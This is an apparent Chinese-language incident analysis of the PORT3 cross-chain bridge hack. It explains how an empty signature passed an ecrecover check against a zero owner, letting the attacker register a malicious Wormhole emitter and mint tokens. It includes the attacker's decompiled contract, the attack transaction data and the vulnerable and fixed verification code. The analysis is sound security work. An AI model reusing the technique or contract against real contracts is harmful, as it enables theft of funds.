

## 黑客是如何完成port3的增发的？

黑客的地址：https://bscscan.com/address/0xb13a503da5f368e48577c87b5d5aec73d08f812e

黑客是利用bridgeIn进行的增发：https://bscscan.com/tx/0x34c17a91b2f2ccd5973ecd49c20cc3c0939c5d8eaeeb740e9dec97fb1345e1da

最后的资金去向是Tornado混币器

## 分析过程

PORT3代币使用了一个名为 CATERC20 的跨链桥代币合约，它集成了 Wormhole 跨链协议，允许代币在不同链之间转移。

黑客在增发过程中调用了方法bridgeIn，利用了跨链桥。

正常跨链流程如下:
1. 用户调用 bridgeOut()
2. 销毁/锁定代币
3. 发送消息给 Wormhole
4. Wormhole Guardian 网络验证用户发送来的消息，确认无误后生成VAA
5. 用户/中继器 提交VAA到目的链
6. bridgeIn()验证Guardian签名
7. 验证通过铸造代币

猜测：
黑客则是伪造VAA 调用bridgeIn() 完成代币的增发

### 查看 VAA
由于黑客调用了bridgeIn，所以无论世事如何，不妨先查看下黑客bridgeIn的Input data

代码见 src/DecodeVAA.t.sol
```Solidity
[PASS] testDecodeAttackVAA() (gas: 12173)
Logs:
  ========== Decoded Payload ==========
  Amount (raw): 1000000000000000
  Amount (tokens): 1000000000
  Token Chain: 23
  To Chain: 4
  Token Decimals: 6
  To Address:
  0x000000000000000000000000b13a503da5f368e48577c87b5d5aec73d08f812e
  Hacker Address: 0xb13A503dA5f368E48577c87b5d5AeC73d08f812E

Traces:
  [12173] DecodeVAATest::testDecodeAttackVAA()
    ├─ [0] console::log("========== Decoded Payload ==========") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Amount (raw):", 1000000000000000 [1e15]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Amount (tokens):", 1000000000 [1e9]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Token Chain:", 23) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("To Chain:", 4) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Token Decimals:", 6) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("To Address:") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log(0x000000000000000000000000b13a503da5f368e48577c87b5d5aec73d08f812e) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Hacker Address:", 0xb13A503dA5f368E48577c87b5d5AeC73d08f812E) [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.37ms (889.02µs CPU time)

Ran 2 tests for test/Counter.t.sol:CounterTest
[PASS] testFuzz_SetNumber(uint256) (runs: 256, μ: 28978, ~: 29289)
Traces:
  [29289] CounterTest::testFuzz_SetNumber(560508847266333054449720557528006 [5.605e32])
    ├─ [22492] Counter::setNumber(560508847266333054449720557528006 [5.605e32])
    │   └─ ← [Stop]
    ├─ [424] Counter::number() [staticcall]
    │   └─ ← [Return] 560508847266333054449720557528006 [5.605e32]
    └─ ← [Stop]

[PASS] test_Increment() (gas: 28783)
Traces:
  [28783] CounterTest::test_Increment()
    ├─ [22418] Counter::increment()
    │   └─ ← [Stop]
    ├─ [424] Counter::number() [staticcall]
    │   └─ ← [Return] 1
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 25.10ms (23.28ms CPU time)

Ran 2 test suites in 41.22ms (33.47ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

黑客跨链记录：https://wormholescan.io/#/txs?address=0xb13A503dA5f368E48577c87b5d5AeC73d08f812E&network=Mainnet

也确实是Arb网络。

### 查询查询 BSC 上 PORT3 合约中注册的 Arbitrum emitter 地址


查询 BSC 上 PORT3 合约的 tokenContracts(23)
```
root@racknerd-9da1d08:~/home/port3-review/wormhole-study# cast call 0xb4357054c3dA8D46eD642383F03139aC7f090343 \
  "tokenContracts(uint16)(bytes32)" 23 \
  --rpc-url https://bsc-dataseed.binance.org
0x00000000000000000000000091d8264e3215de766cba1cc936b08287b931bcdf
```
```
BSC 合约注册的 Arbitrum Emitter:
0x00000000000000000000000091d8264e3215de766cba1cc936b08287b931bcdf
                          └─> 0x91d8264e3215de766cba1cc936b08287b931bcdf

VAA 中使用的 Emitter:
0x0000000000000000000000004644bbcfd26a79a79254af30ed8ab80658a73b32
                          └─> 0x4644bbcfd26a79a79254af30ed8ab80658a73b32

结果: 不匹配！
```

### 完整攻击流程分析


1. 黑客在 Arbitrum 部署恶意合约
黑客地址：https://bscscan.com/address/0xb13a503da5f368e48577c87b5d5aec73d08f812e  
部署的恶意合约：0x4644bbcfd26a79a79254af30ed8ab80658a73b32

反编译恶意合约代码：
```Solidity
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  contract FakeToken {
      string public name = "My Token";
      string public symbol = "MTK";
      uint8 public decimals = 6;

      uint256 private _totalSupply;
      mapping(address => uint256) private _balances;

      event Transfer(address indexed from, address indexed to, uint256 value);
      event WormholeCallSuccess(uint64 sequence);
      event WormholeCallFailed(bytes reason);

      constructor() {
          uint256 supply = 1_000_000_000 * 10**6;
          _totalSupply = supply;
          _balances[msg.sender] = supply;
          emit Transfer(address(0), msg.sender, supply);
      }

      function totalSupply() public view returns (uint256) {
          return _totalSupply;
      }

      function balanceOf(address account) public view returns (uint256) {
          return _balances[account];
      }

      function sendMessageToWormhole(
          bytes memory payload,
          uint32 nonce,
          uint8 consistencyLevel
      ) external payable returns (uint64) {
          address wormholeAddr = 0xa5f208e072434bC67592E4C49C1B991BA79BCA46;

          bytes memory callData = abi.encodeWithSignature(
              "publishMessage(uint32,bytes,uint8)",
              nonce,
              payload,
              consistencyLevel
          );

          (bool success, bytes memory returnData) = wormholeAddr.call{value: msg.value}(callData);

          if (!success) {
              emit WormholeCallFailed(returnData);


              if (returnData.length > 0) {
                  assembly {
                      let returnDataSize := mload(returnData)
                      revert(add(32, returnData), returnDataSize)
                  }
              } else {
                  revert("Wormhole call failed with no reason");
              }
          }

          uint64 sequence = abi.decode(returnData, (uint64));
          emit WormholeCallSuccess(sequence);

          return sequence;
      }
  }

```
该合约
- 伪装成了ERC20代币
- sendMessageToWormhole() 可以发送任意跨链消息 还特意写了这么一个方法，可以调用wormhole合约发送跨链信息，很可能就是为了伪造VAA

2. BSC 上的 PORT3 合约错误地将这个恶意合约注册为 Arbitrum 的合法 emitter（黑客攻击还是内部作恶？）
PORT3合约反编译:https://app.dedaub.com/binance/address/0xb4357054c3da8d46ed642383f03139ac7f090343/decompiled 

我们查询下 emitter 最近的注册哈希：https://bscscan.com/advanced-filter?fadd=0xb4357054c3da8d46ed642383f03139ac7f090343&tadd=0xb4357054c3da8d46ed642383f03139ac7f090343&mtd=0x2c5485f4%7eRegister+Chain%2c0x2c5485f4%7eRegister+Chain

2025.11.22 23:38 开始进行的增发，也就是说注册错emmitter应该是在这个时间之前，翻页后刚好可以看到0xb13地址，这个恰好是黑客的地址。
注册哈希：https://bscscan.com/tx/0xfaf450571541b95f924024ac3febd5cf6c16695ce787217ca8870350309051c1

我们来解析一下该笔交互
```
root@racknerd-9da1d08:~/home/port3-review# cast tx 0xfaf450571541b95f924024ac3febd5cf6c16695ce787217ca8870350309051c1 \
  --rpc-url https://bsc-dataseed.binance.org

blockHash            0x357ed85e5c3d9b7736bf9e95c919077baf250ec95f71cf7217718769d706efe6
blockNumber          69114275
from                 0xb13A503dA5f368E48577c87b5d5AeC73d08f812E
transactionIndex     17
effectiveGasPrice    50000000

accessList           []
chainId              56
gasLimit             76950
hash                 0xfaf450571541b95f924024ac3febd5cf6c16695ce787217ca8870350309051c1
input                0x2c5485f4000000000000000000000000000000000000000000000000000000000000001700000000000000000000000092d7af0abac7128a5051b9a16b514e768e5b30f30000000000000000000000000000000000000000000000000000000000000060000000000000000000000000b13a503da5f368e48577c87b5d5aec73d08f812e00000000000000000000000000000000000000000000000000000002540be3ff00000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000041000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
maxFeePerGas         50000000
maxPriorityFeePerGas 50000000
nonce                0
r                    0x5559b4b8f9f0d503f53a939b11178a5e363edc2d2aa9c07abaf0558970d0a3b1
s                    0x4a92e19f11c20355114d2437dfda0c7d24a9a306360960c62172b5dd92446fad
to                   0xb4357054c3dA8D46eD642383F03139aC7f090343
type                 2
value                0
yParity              1
            
root@racknerd-9da1d08:~/home/port3-review# 
```

这个交易是黑客自己发起的，说明不是项目方权限地址点击了什么诱导链接，同时看上面的明细可以看到signature: 全是 0x00 (空签名)。  

说明 onlyOwnerOrOwnerSignature 修饰符存在漏洞，允许空签名通过验证！

先反编译下port3合约，看是哪个函数出现了漏洞
https://app.dedaub.com/binance/address/0xb4357054c3da8d46ed642383f03139ac7f090343/decompiled

经过审查发现
```
function 0xc40(address varg0, bytes varg1, uint256 varg2) private { 
    require(65 == varg1.length);
    MEM[MEM[64]] = 0;
    v0, /* address */ v1 = ecrecover(varg2, uint8(byte(MEM[varg1 + 96], 0x0)), MEM[varg1.data], MEM[varg1 + 64]);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    if (address(v1) != varg0) {
        return 0;
    } else {
        return 1;
    }
}
```
该函数没有检查 ecrecover 返回的地址是否为 0x0，并且在registerChain函数中使用到了该方法。
```
攻击利用:
_owner = 0x0  
signature = 0x00...00 (65字节全0)

ecrecover(hash, 0, 0, 0) → 返回 0x0

比较: v1 != varg0
      → 0x0 != 0x0
      → false
      → return 1 (验证通过!) 
```
不妨对比一下正确的代码和错误的代码，如下所示
```
// 漏洞代码
function verify(address owner, bytes sig, bytes32 hash) {
    address recovered = ecrecover(hash, v, r, s);
    return recovered == owner;  // 当 owner=0x0 且签名无效时，0x0==0x0 通过！
}

// 正确代码
function verify(address owner, bytes sig, bytes32 hash) {
    address recovered = ecrecover(hash, v, r, s);
    require(recovered != address(0), "Invalid signature");  // ← 必须加这行！
    return recovered == owner;
}
```
```

查询 wormhole 看该地址的跨链情况：https://wormholescan.io/#/txs?address=0xb13A503dA5f368E48577c87b5d5AeC73d08f812E&network=Mainnet

可以发现黑客有三笔跨链记录。